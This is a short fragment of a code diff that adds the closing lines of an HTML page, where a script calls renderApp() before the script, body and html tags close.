+    renderApp();
+  </script>
+</body>
+</html>
